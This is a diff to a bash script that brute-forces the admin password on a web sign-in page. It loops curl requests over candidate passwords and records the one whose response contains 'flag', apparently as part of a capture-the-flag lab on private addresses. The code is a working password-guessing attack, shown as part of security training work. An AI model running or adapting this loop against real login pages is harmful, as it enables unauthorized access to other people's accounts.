@@ -9,16 +9,15 @@ function try() {
 	local line=$1
 
 	PTDR=$(mktemp)
-	curl "http://10.13.248.102/?page=signin&username=admin&password=$line&Login=Login#" \
+	curl "${URL_ROOT:-http://10.13.248.94}/?page=signin&username=admin&password=$line&Login=Login#" \
 		--compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0' \
 		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
 		-H 'Accept-Language: en-US,en;q=0.5' \
 		-H 'Accept-Encoding: gzip, deflate' \
-		-H 'Connection: close' \
-		-H 'Referer: http://10.13.248.102/?page=signin' > $PTDR 2>/dev/null
+		-H 'Connection: close'  > $PTDR 2>/dev/null
 
 	if grep -q "flag" $PTDR; then
-		echo "Flag found: $line"
+		echo "Pass found: $line"
 		echo $line > password
 	fi
 	rm $PTDR
@@ -50,7 +49,7 @@ if [ $sourced -eq 0 ]; then
 		sleep 0.2
 	done
 	PASS=$(cat password)
-	jobs -p | xargs -n1 pkill -P
+	# jobs -p | xargs -n1 pkill -P
 	wait
 
 	echo
